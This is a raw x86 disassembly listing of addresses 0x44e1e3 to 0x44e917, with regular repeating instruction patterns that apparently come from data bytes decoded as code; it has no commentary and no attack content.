  44e1e3:	mov    dl,0xf5
  44e1e5:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e1eb:	mov    dl,0xf5
  44e1ed:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e1f3:	mov    dl,0xe
  44e1f5:	jmp    0xe953948d
  44e1fa:	xchg   ebx,eax
  44e1fb:	mov    dl,0xe
  44e1fd:	jmp    0xe9539495
  44e202:	xchg   ebx,eax
  44e203:	mov    dl,0xe
  44e205:	jmp    0xe953949d
  44e20a:	xchg   ebx,eax
  44e20b:	mov    dl,0xe
  44e20d:	jmp    0xe95394a5
  44e212:	xchg   ebx,eax
  44e213:	mov    dl,0xe
  44e215:	jmp    0xe95394ad
  44e21a:	xchg   ebx,eax
  44e21b:	mov    dl,0xe
  44e21d:	jmp    0xe95394b5
  44e222:	xchg   ebx,eax
  44e223:	mov    dl,0xe
  44e225:	jmp    0xe95394bd
  44e22a:	xchg   ebx,eax
  44e22b:	mov    dl,0xe
  44e22d:	jmp    0xe95394c5
  44e232:	xchg   ebx,eax
  44e233:	mov    dl,0xe
  44e235:	jmp    0xe95394cd
  44e23a:	xchg   ebx,eax
  44e23b:	mov    dl,0xe
  44e23d:	jmp    0x44e242
  44e242:	add    BYTE PTR [ebx-0x6c16f14e],dl
  44e248:	mov    dl,0xe
  44e24a:	jmp    0xe95394e2
  44e24f:	xchg   ebx,eax
  44e250:	mov    dl,0xe
  44e252:	jmp    0xe95394ea
  44e257:	xchg   ebx,eax
  44e258:	mov    dl,0xe
  44e25a:	jmp    0xe95394f2
  44e25f:	xchg   ebx,eax
  44e260:	mov    dl,0xe
  44e262:	jmp    0xe95394fa
  44e267:	xchg   ebx,eax
  44e268:	mov    dl,0xe
  44e26a:	jmp    0xe9539502
  44e26f:	xchg   ebx,eax
  44e270:	mov    dl,0xe
  44e272:	add    BYTE PTR [ecx-0x56fff152],bh
  44e278:	scas   al,BYTE PTR es:[edi]
  44e279:	push   cs
  44e27a:	add    BYTE PTR [ecx-0x46fff152],ch
  44e280:	scas   al,BYTE PTR es:[edi]
  44e281:	push   cs
  44e282:	add    BYTE PTR [ecx-0x56fff152],bh
  44e288:	scas   al,BYTE PTR es:[edi]
  44e289:	push   cs
  44e28a:	add    BYTE PTR [ecx+0x79000eae],ch
  44e290:	mov    dh,0xe
  44e292:	add    BYTE PTR [ecx-0x4a],bh
  44e295:	push   cs
  44e296:	add    BYTE PTR [ecx-0x4a],ch
  44e299:	push   cs
  44e29a:	add    BYTE PTR [ecx-0x4a],ch
  44e29d:	push   cs
  44e29e:	add    BYTE PTR [ecx-0x4a],bh
  44e2a1:	push   cs
  44e2a2:	add    BYTE PTR [ecx-0x4a],bh
  44e2a5:	push   cs
  44e2a6:	add    BYTE PTR [eax],al
  44e2a8:	add    BYTE PTR [eax],al
  44e2aa:	add    BYTE PTR [eax],al
  44e2ac:	imul   esi,DWORD PTR [esi-0x4996fff2],0xb639000e
  44e2b6:	push   cs
  44e2b7:	add    BYTE PTR [ecx],bh
  44e2b9:	mov    dh,0xe
  44e2bb:	add    BYTE PTR [ecx],ch
  44e2bd:	mov    dh,0xe
  44e2bf:	add    BYTE PTR [ecx],ch
  44e2c1:	mov    dh,0xe
  44e2c3:	add    BYTE PTR [ecx],bh
  44e2c5:	mov    dh,0xe
  44e2c7:	add    BYTE PTR [ecx],bh
  44e2c9:	mov    dh,0xe
  44e2cb:	add    BYTE PTR [ecx],ch
  44e2cd:	mov    dh,0xe
  44e2cf:	add    BYTE PTR [ecx],ch
  44e2d1:	mov    dh,0xe
  44e2d3:	add    cl,bh
  44e2d5:	mov    ch,0xe
  44e2d7:	add    cl,bh
  44e2d9:	mov    ch,0xe
  44e2db:	add    cl,ch
  44e2dd:	mov    ch,0xe
  44e2df:	add    cl,ch
  44e2e1:	mov    ch,0xe
  44e2e3:	add    cl,bh
  44e2e5:	mov    ch,0xe
  44e2e7:	add    cl,bh
  44e2e9:	mov    ch,0xe
  44e2eb:	add    cl,ch
  44e2ed:	mov    ch,0xe
  44e2ef:	add    BYTE PTR [eax-0x6ffff3e5],dl
  44e2f5:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e2f8:	nop
  44e2f9:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e2fc:	nop
  44e2fd:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e300:	nop
  44e301:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e304:	nop
  44e305:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e308:	nop
  44e309:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e30c:	nop
  44e30d:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e310:	add    BYTE PTR [eax],al
  44e312:	add    BYTE PTR [eax],al
  44e314:	add    BYTE PTR [eax-0x6ffff3e5],dl
  44e31a:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e31d:	nop
  44e31e:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e321:	nop
  44e322:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e325:	nop
  44e326:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e329:	nop
  44e32a:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e32d:	nop
  44e32e:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e331:	nop
  44e332:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e335:	nop
  44e336:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e339:	nop
  44e33a:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e33d:	nop
  44e33e:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e341:	nop
  44e342:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e345:	nop
  44e346:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e349:	nop
  44e34a:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e34d:	nop
  44e34e:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e351:	nop
  44e352:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e355:	nop
  44e356:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e359:	nop
  44e35a:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e35d:	nop
  44e35e:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e361:	nop
  44e362:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e365:	nop
  44e366:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e369:	nop
  44e36a:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e36d:	nop
  44e36e:	mov    dl,0xf5
  44e370:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e376:	mov    dl,0xf5
  44e378:	add    eax,DWORD PTR [eax]
  44e37a:	add    BYTE PTR [eax],al
  44e37c:	add    BYTE PTR [eax],al
  44e37e:	nop
  44e37f:	mov    dl,0xf5
  44e381:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e387:	mov    dl,0xf5
  44e389:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e38f:	mov    dl,0xf5
  44e391:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e397:	mov    dl,0xf5
  44e399:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e39f:	mov    dl,0xf5
  44e3a1:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e3a7:	mov    dl,0xf5
  44e3a9:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e3af:	mov    dl,0xf5
  44e3b1:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e3b7:	mov    dl,0xf5
  44e3b9:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e3bf:	mov    dl,0xf5
  44e3c1:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e3c7:	mov    dl,0xf5
  44e3c9:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e3cf:	mov    dl,0xf5
  44e3d1:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e3d7:	mov    dl,0xf5
  44e3d9:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e3df:	mov    dl,0xf5
  44e3e1:	add    eax,DWORD PTR [eax]
  44e3e3:	add    BYTE PTR [eax],al
  44e3e5:	add    BYTE PTR [eax],al
  44e3e7:	nop
  44e3e8:	mov    dl,0xf5
  44e3ea:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e3f0:	mov    dl,0xe
  44e3f2:	jmp    0xe953968a
  44e3f7:	xchg   ebx,eax
  44e3f8:	mov    dl,0xe
  44e3fa:	jmp    0xe9539692
  44e3ff:	xchg   ebx,eax
  44e400:	mov    dl,0xe
  44e402:	jmp    0xe953969a
  44e407:	xchg   ebx,eax
  44e408:	mov    dl,0xe
  44e40a:	jmp    0xe95396a2
  44e40f:	xchg   ebx,eax
  44e410:	mov    dl,0xe
  44e412:	jmp    0xe95396aa
  44e417:	xchg   ebx,eax
  44e418:	mov    dl,0xe
  44e41a:	jmp    0xe95396b2
  44e41f:	xchg   ebx,eax
  44e420:	mov    dl,0xe
  44e422:	jmp    0xe95396ba
  44e427:	xchg   ebx,eax
  44e428:	mov    dl,0xe
  44e42a:	jmp    0xe95396c2
  44e42f:	xchg   ebx,eax
  44e430:	mov    dl,0xe
  44e432:	jmp    0xe95396ca
  44e437:	xchg   ebx,eax
  44e438:	mov    dl,0xe
  44e43a:	jmp    0xe95396d2
  44e43f:	xchg   ebx,eax
  44e440:	mov    dl,0xe
  44e442:	jmp    0xe95396da
  44e447:	xchg   ebx,eax
  44e448:	mov    dl,0xe
  44e44a:	jmp    0x44e44f
  44e44f:	add    BYTE PTR [ebx-0x6c16f14e],dl
  44e455:	mov    dl,0xe
  44e457:	jmp    0xe95396ef
  44e45c:	xchg   ebx,eax
  44e45d:	mov    dl,0xe
  44e45f:	jmp    0xe95396f7
  44e464:	xchg   ebx,eax
  44e465:	mov    dl,0xe
  44e467:	jmp    0xe95396ff
  44e46c:	xchg   ebx,eax
  44e46d:	mov    dl,0xe
  44e46f:	add    cl,ch
  44e471:	mov    dl,0xe
  44e473:	add    cl,ch
  44e475:	mov    dl,0xe
  44e477:	add    cl,bh
  44e479:	mov    dl,0xe
  44e47b:	add    cl,bh
  44e47d:	mov    dl,0xe
  44e47f:	add    cl,ch
  44e481:	mov    dl,0xe
  44e483:	add    cl,ch
  44e485:	mov    dl,0xe
  44e487:	add    BYTE PTR [ecx-0x46fff14e],bh
  44e48d:	mov    dl,0xe
  44e48f:	add    BYTE PTR [ecx-0x56fff14e],ch
  44e495:	mov    dl,0xe
  44e497:	add    BYTE PTR [ecx-0x46fff14e],bh
  44e49d:	mov    dl,0xe
  44e49f:	add    BYTE PTR [ecx-0x56fff14e],ch
  44e4a5:	mov    dl,0xe
  44e4a7:	add    BYTE PTR [ecx-0x4e],bh
  44e4aa:	push   cs
  44e4ab:	add    BYTE PTR [ecx-0x4e],bh
  44e4ae:	push   cs
  44e4af:	add    BYTE PTR [ecx-0x4e],ch
  44e4b2:	push   cs
  44e4b3:	add    BYTE PTR [eax],al
  44e4b5:	add    BYTE PTR [eax],al
  44e4b7:	add    BYTE PTR [eax],al
  44e4b9:	imul   esi,DWORD PTR [edx-0x4d86fff2],0xb279000e
  44e4c3:	push   cs
  44e4c4:	add    BYTE PTR [ecx-0x4e],ch
  44e4c7:	push   cs
  44e4c8:	add    BYTE PTR [ecx-0x4e],ch
  44e4cb:	push   cs
  44e4cc:	add    BYTE PTR [ecx],bh
  44e4ce:	mov    dl,0xe
  44e4d0:	add    BYTE PTR [ecx],bh
  44e4d2:	mov    dl,0xe
  44e4d4:	add    BYTE PTR [ecx],ch
  44e4d6:	mov    dl,0xe
  44e4d8:	add    BYTE PTR [ecx],ch
  44e4da:	mov    dl,0xe
  44e4dc:	add    BYTE PTR [ecx],bh
  44e4de:	mov    dl,0xe
  44e4e0:	add    BYTE PTR [ecx],bh
  44e4e2:	mov    dl,0xe
  44e4e4:	add    BYTE PTR [ecx],ch
  44e4e6:	mov    dl,0xe
  44e4e8:	add    BYTE PTR [ecx],ch
  44e4ea:	mov    dl,0xe
  44e4ec:	add    BYTE PTR [eax-0x6ffff3e5],dl
  44e4f2:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e4f5:	nop
  44e4f6:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e4f9:	nop
  44e4fa:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e4fd:	nop
  44e4fe:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e501:	nop
  44e502:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e505:	nop
  44e506:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e509:	nop
  44e50a:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e50d:	nop
  44e50e:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e511:	nop
  44e512:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e515:	nop
  44e516:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e519:	nop
  44e51a:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e51d:	add    BYTE PTR [eax],al
  44e51f:	add    BYTE PTR [eax],al
  44e521:	add    BYTE PTR [eax-0x6ffff3e5],dl
  44e527:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e52a:	nop
  44e52b:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e52e:	nop
  44e52f:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e532:	nop
  44e533:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e536:	nop
  44e537:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e53a:	nop
  44e53b:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e53e:	nop
  44e53f:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e542:	nop
  44e543:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e546:	nop
  44e547:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e54a:	nop
  44e54b:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e54e:	nop
  44e54f:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e552:	nop
  44e553:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e556:	nop
  44e557:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e55a:	nop
  44e55b:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e55e:	nop
  44e55f:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e562:	nop
  44e563:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e566:	nop
  44e567:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e56a:	nop
  44e56b:	mov    dl,0xf5
  44e56d:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e573:	mov    dl,0xf5
  44e575:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e57b:	mov    dl,0xf5
  44e57d:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e583:	mov    dl,0xf5
  44e585:	add    eax,DWORD PTR [eax]
  44e587:	add    BYTE PTR [eax],al
  44e589:	add    BYTE PTR [eax],al
  44e58b:	nop
  44e58c:	mov    dl,0xf5
  44e58e:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e594:	mov    dl,0xf5
  44e596:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e59c:	mov    dl,0xf5
  44e59e:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e5a4:	mov    dl,0xf5
  44e5a6:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e5ac:	mov    dl,0xf5
  44e5ae:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e5b4:	mov    dl,0xf5
  44e5b6:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e5bc:	mov    dl,0xf5
  44e5be:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e5c4:	mov    dl,0xf5
  44e5c6:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e5cc:	mov    dl,0xf5
  44e5ce:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e5d4:	mov    dl,0xf5
  44e5d6:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e5dc:	mov    dl,0xf5
  44e5de:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e5e4:	mov    dl,0xf5
  44e5e6:	add    edx,DWORD PTR [eax-0x6c16f14e]
  44e5ec:	mov    dl,0xe
  44e5ee:	jmp    0x44e5f3
  44e5f3:	add    BYTE PTR [ebx-0x6c16f14e],dl
  44e5f9:	mov    dl,0xe
  44e5fb:	jmp    0xe9539893
  44e600:	xchg   ebx,eax
  44e601:	mov    dl,0xe
  44e603:	jmp    0xe953989b
  44e608:	xchg   ebx,eax
  44e609:	mov    dl,0xe
  44e60b:	jmp    0xe95398a3
  44e610:	xchg   ebx,eax
  44e611:	mov    dl,0xe
  44e613:	jmp    0xe95398ab
  44e618:	xchg   ebx,eax
  44e619:	mov    dl,0xe
  44e61b:	jmp    0xe95398b3
  44e620:	xchg   ebx,eax
  44e621:	mov    dl,0xe
  44e623:	jmp    0xe95398bb
  44e628:	xchg   ebx,eax
  44e629:	mov    dl,0xe
  44e62b:	jmp    0xe95398c3
  44e630:	xchg   ebx,eax
  44e631:	mov    dl,0xe
  44e633:	jmp    0xe95398cb
  44e638:	xchg   ebx,eax
  44e639:	mov    dl,0xe
  44e63b:	jmp    0xe95398d3
  44e640:	xchg   ebx,eax
  44e641:	mov    dl,0xe
  44e643:	jmp    0xe95398db
  44e648:	xchg   ebx,eax
  44e649:	mov    dl,0xe
  44e64b:	jmp    0xe95398e3
  44e650:	xchg   ebx,eax
  44e651:	mov    dl,0xe
  44e653:	jmp    0xe95398eb
  44e658:	add    BYTE PTR [eax],al
  44e65a:	add    BYTE PTR [eax],al
  44e65c:	add    BYTE PTR [ebx-0x6c16f14e],dl
  44e662:	mov    dl,0xe
  44e664:	jmp    0xe95398fc
  44e669:	xchg   ebx,eax
  44e66a:	mov    dl,0xe
  44e66c:	add    BYTE PTR [ecx],ch
  44e66e:	scas   eax,DWORD PTR es:[edi]
  44e66f:	push   cs
  44e670:	add    BYTE PTR [ecx],bh
  44e672:	scas   eax,DWORD PTR es:[edi]
  44e673:	push   cs
  44e674:	add    BYTE PTR [ecx],bh
  44e676:	scas   eax,DWORD PTR es:[edi]
  44e677:	push   cs
  44e678:	add    BYTE PTR [ecx],ch
  44e67a:	scas   eax,DWORD PTR es:[edi]
  44e67b:	push   cs
  44e67c:	add    BYTE PTR [ecx],ch
  44e67e:	scas   eax,DWORD PTR es:[edi]
  44e67f:	push   cs
  44e680:	add    cl,bh
  44e682:	scas   al,BYTE PTR es:[edi]
  44e683:	push   cs
  44e684:	add    cl,bh
  44e686:	scas   al,BYTE PTR es:[edi]
  44e687:	push   cs
  44e688:	add    cl,ch
  44e68a:	scas   al,BYTE PTR es:[edi]
  44e68b:	push   cs
  44e68c:	add    cl,ch
  44e68e:	scas   al,BYTE PTR es:[edi]
  44e68f:	push   cs
  44e690:	add    cl,bh
  44e692:	scas   al,BYTE PTR es:[edi]
  44e693:	push   cs
  44e694:	add    cl,bh
  44e696:	scas   al,BYTE PTR es:[edi]
  44e697:	push   cs
  44e698:	add    cl,ch
  44e69a:	scas   al,BYTE PTR es:[edi]
  44e69b:	push   cs
  44e69c:	add    cl,ch
  44e69e:	scas   al,BYTE PTR es:[edi]
  44e69f:	push   cs
  44e6a0:	add    BYTE PTR [ecx-0x46fff152],bh
  44e6a6:	scas   al,BYTE PTR es:[edi]
  44e6a7:	push   cs
  44e6a8:	add    BYTE PTR [ecx-0x56fff152],ch
  44e6ae:	scas   al,BYTE PTR es:[edi]
  44e6af:	push   cs
  44e6b0:	add    BYTE PTR [ecx-0x46fff152],bh
  44e6b6:	scas   al,BYTE PTR es:[edi]
  44e6b7:	push   cs
  44e6b8:	add    BYTE PTR [ecx-0x56fff152],ch
  44e6be:	scas   al,BYTE PTR es:[edi]
  44e6bf:	push   cs
  44e6c0:	add    BYTE PTR [eax],al
  44e6c2:	add    BYTE PTR [eax],al
  44e6c4:	add    BYTE PTR [eax],al
  44e6c6:	jns    0x44e67e
  44e6c8:	push   cs
  44e6c9:	add    BYTE PTR [ecx-0x4a],bh
  44e6cc:	push   cs
  44e6cd:	add    BYTE PTR [ecx-0x4a],ch
  44e6d0:	push   cs
  44e6d1:	add    BYTE PTR [ecx-0x4a],ch
  44e6d4:	push   cs
  44e6d5:	add    BYTE PTR [ecx-0x4a],bh
  44e6d8:	push   cs
  44e6d9:	add    BYTE PTR [ecx-0x4a],bh
  44e6dc:	push   cs
  44e6dd:	add    BYTE PTR [ecx-0x4a],ch
  44e6e0:	push   cs
  44e6e1:	add    BYTE PTR [ecx-0x4a],ch
  44e6e4:	push   cs
  44e6e5:	add    BYTE PTR [ecx],bh
  44e6e7:	mov    dh,0xe
  44e6e9:	add    BYTE PTR [eax-0x6ffff3f5],dl
  44e6ef:	or     ecx,DWORD PTR [eax+eax*1]
  44e6f2:	nop
  44e6f3:	or     ecx,DWORD PTR [eax+eax*1]
  44e6f6:	nop
  44e6f7:	or     ecx,DWORD PTR [eax+eax*1]
  44e6fa:	nop
  44e6fb:	or     ecx,DWORD PTR [eax+eax*1]
  44e6fe:	nop
  44e6ff:	or     ecx,DWORD PTR [eax+eax*1]
  44e702:	nop
  44e703:	or     ecx,DWORD PTR [eax+eax*1]
  44e706:	nop
  44e707:	or     ecx,DWORD PTR [eax+eax*1]
  44e70a:	nop
  44e70b:	or     ecx,DWORD PTR [eax+eax*1]
  44e70e:	nop
  44e70f:	or     ecx,DWORD PTR [eax+eax*1]
  44e712:	nop
  44e713:	or     ecx,DWORD PTR [eax+eax*1]
  44e716:	nop
  44e717:	or     ecx,DWORD PTR [eax+eax*1]
  44e71a:	nop
  44e71b:	or     ecx,DWORD PTR [eax+eax*1]
  44e71e:	nop
  44e71f:	or     ecx,DWORD PTR [eax+eax*1]
  44e722:	nop
  44e723:	or     ecx,DWORD PTR [eax+eax*1]
  44e726:	nop
  44e727:	or     ecx,DWORD PTR [eax+eax*1]
  44e72a:	add    BYTE PTR [eax],al
  44e72c:	add    BYTE PTR [eax],al
  44e72e:	add    BYTE PTR [eax-0x6ffff3f5],dl
  44e734:	or     ecx,DWORD PTR [eax+eax*1]
  44e737:	nop
  44e738:	or     ecx,DWORD PTR [eax+eax*1]
  44e73b:	nop
  44e73c:	or     ecx,DWORD PTR [eax+eax*1]
  44e73f:	nop
  44e740:	or     ecx,DWORD PTR [eax+eax*1]
  44e743:	nop
  44e744:	or     ecx,DWORD PTR [eax+eax*1]
  44e747:	nop
  44e748:	or     ecx,DWORD PTR [eax+eax*1]
  44e74b:	nop
  44e74c:	or     ecx,DWORD PTR [eax+eax*1]
  44e74f:	nop
  44e750:	or     ecx,DWORD PTR [eax+eax*1]
  44e753:	nop
  44e754:	or     ecx,DWORD PTR [eax+eax*1]
  44e757:	nop
  44e758:	or     ecx,DWORD PTR [eax+eax*1]
  44e75b:	nop
  44e75c:	or     ecx,DWORD PTR [eax+eax*1]
  44e75f:	nop
  44e760:	or     ecx,DWORD PTR [eax+eax*1]
  44e763:	nop
  44e764:	or     ecx,DWORD PTR [eax+eax*1]
  44e767:	nop
  44e768:	mov    dl,0xf5
  44e76a:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e770:	mov    dl,0xf5
  44e772:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e778:	mov    dl,0xf5
  44e77a:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e780:	mov    dl,0xf5
  44e782:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e788:	mov    dl,0xf5
  44e78a:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e790:	mov    dl,0xf5
  44e792:	add    eax,DWORD PTR [eax]
  44e794:	add    BYTE PTR [eax],al
  44e796:	add    BYTE PTR [eax],al
  44e798:	nop
  44e799:	mov    dl,0xf5
  44e79b:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e7a1:	mov    dl,0xf5
  44e7a3:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e7a9:	mov    dl,0xf5
  44e7ab:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e7b1:	mov    dl,0xf5
  44e7b3:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e7b9:	mov    dl,0xf5
  44e7bb:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e7c1:	mov    dl,0xf5
  44e7c3:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e7c9:	mov    dl,0xf5
  44e7cb:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e7d1:	mov    dl,0xf5
  44e7d3:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e7d9:	mov    dl,0xf5
  44e7db:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e7e1:	mov    dl,0xf5
  44e7e3:	add    edx,DWORD PTR [eax-0x6c16f14e]
  44e7e9:	mov    dl,0xe
  44e7eb:	jmp    0xe9539a83
  44e7f0:	xchg   ebx,eax
  44e7f1:	mov    dl,0xe
  44e7f3:	jmp    0xe9539a8b
  44e7f8:	xchg   ebx,eax
  44e7f9:	mov    dl,0xe
  44e7fb:	jmp    0x44e800
  44e800:	add    BYTE PTR [ebx-0x6c16f14e],dl
  44e806:	mov    dl,0xe
  44e808:	jmp    0xe9539aa0
  44e80d:	xchg   ebx,eax
  44e80e:	mov    dl,0xe
  44e810:	jmp    0xe9539aa8
  44e815:	xchg   ebx,eax
  44e816:	mov    dl,0xe
  44e818:	jmp    0xe9539ab0
  44e81d:	xchg   ebx,eax
  44e81e:	mov    dl,0xe
  44e820:	jmp    0xe9539ab8
  44e825:	xchg   ebx,eax
  44e826:	mov    dl,0xe
  44e828:	jmp    0xe9539ac0
  44e82d:	xchg   ebx,eax
  44e82e:	mov    dl,0xe
  44e830:	jmp    0xe9539ac8
  44e835:	xchg   ebx,eax
  44e836:	mov    dl,0xe
  44e838:	jmp    0xe9539ad0
  44e83d:	xchg   ebx,eax
  44e83e:	mov    dl,0xe
  44e840:	jmp    0xe9539ad8
  44e845:	xchg   ebx,eax
  44e846:	mov    dl,0xe
  44e848:	jmp    0xe9539ae0
  44e84d:	xchg   ebx,eax
  44e84e:	mov    dl,0xe
  44e850:	jmp    0xe9539ae8
  44e855:	xchg   ebx,eax
  44e856:	mov    dl,0xe
  44e858:	jmp    0xe9539af0
  44e85d:	xchg   ebx,eax
  44e85e:	mov    dl,0xe
  44e860:	jmp    0x539af8
  44e865:	add    BYTE PTR [eax],al
  44e867:	add    BYTE PTR [eax],al
  44e869:	add    BYTE PTR [ecx-0x4d],bh
  44e86c:	push   cs
  44e86d:	add    BYTE PTR [ecx-0x4d],bh
  44e870:	push   cs
  44e871:	add    BYTE PTR [ecx-0x4d],ch
  44e874:	push   cs
  44e875:	add    BYTE PTR [ecx-0x4d],ch
  44e878:	push   cs
  44e879:	add    BYTE PTR [ecx],bh
  44e87b:	mov    bl,0xe
  44e87d:	add    BYTE PTR [ecx],bh
  44e87f:	mov    bl,0xe
  44e881:	add    BYTE PTR [ecx],ch
  44e883:	mov    bl,0xe
  44e885:	add    BYTE PTR [ecx],ch
  44e887:	mov    bl,0xe
  44e889:	add    BYTE PTR [ecx],bh
  44e88b:	mov    bl,0xe
  44e88d:	add    BYTE PTR [ecx],bh
  44e88f:	mov    bl,0xe
  44e891:	add    BYTE PTR [ecx],ch
  44e893:	mov    bl,0xe
  44e895:	add    BYTE PTR [ecx],ch
  44e897:	mov    bl,0xe
  44e899:	add    cl,bh
  44e89b:	mov    dl,0xe
  44e89d:	add    cl,bh
  44e89f:	mov    dl,0xe
  44e8a1:	add    cl,ch
  44e8a3:	mov    dl,0xe
  44e8a5:	add    cl,ch
  44e8a7:	mov    dl,0xe
  44e8a9:	add    cl,bh
  44e8ab:	mov    dl,0xe
  44e8ad:	add    cl,bh
  44e8af:	mov    dl,0xe
  44e8b1:	add    cl,ch
  44e8b3:	mov    dl,0xe
  44e8b5:	add    cl,ch
  44e8b7:	mov    dl,0xe
  44e8b9:	add    BYTE PTR [ecx-0x46fff14e],bh
  44e8bf:	mov    dl,0xe
  44e8c1:	add    BYTE PTR [ecx-0x56fff14e],ch
  44e8c7:	mov    dl,0xe
  44e8c9:	add    BYTE PTR [ecx+0xeb2],bh
  44e8cf:	add    BYTE PTR [eax],al
  44e8d1:	add    BYTE PTR [eax],al
  44e8d3:	mov    ecx,0xa9000eb2
  44e8d8:	mov    dl,0xe
  44e8da:	add    BYTE PTR [ecx+0x79000eb2],ch
  44e8e0:	mov    dl,0xe
  44e8e2:	add    BYTE PTR [ecx-0x4e],bh
  44e8e5:	push   cs
  44e8e6:	add    BYTE PTR [eax-0x6ffff3f5],dl
  44e8ec:	or     ecx,DWORD PTR [eax+eax*1]
  44e8ef:	nop
  44e8f0:	or     ecx,DWORD PTR [eax+eax*1]
  44e8f3:	nop
  44e8f4:	or     ecx,DWORD PTR [eax+eax*1]
  44e8f7:	nop
  44e8f8:	or     ecx,DWORD PTR [eax+eax*1]
  44e8fb:	nop
  44e8fc:	or     ecx,DWORD PTR [eax+eax*1]
  44e8ff:	nop
  44e900:	or     ecx,DWORD PTR [eax+eax*1]
  44e903:	nop
  44e904:	or     ecx,DWORD PTR [eax+eax*1]
  44e907:	nop
  44e908:	or     ecx,DWORD PTR [eax+eax*1]
  44e90b:	nop
  44e90c:	or     ecx,DWORD PTR [eax+eax*1]
  44e90f:	nop
  44e910:	or     ecx,DWORD PTR [eax+eax*1]
  44e913:	nop
  44e914:	or     ecx,DWORD PTR [eax+eax*1]
  44e917:	nop
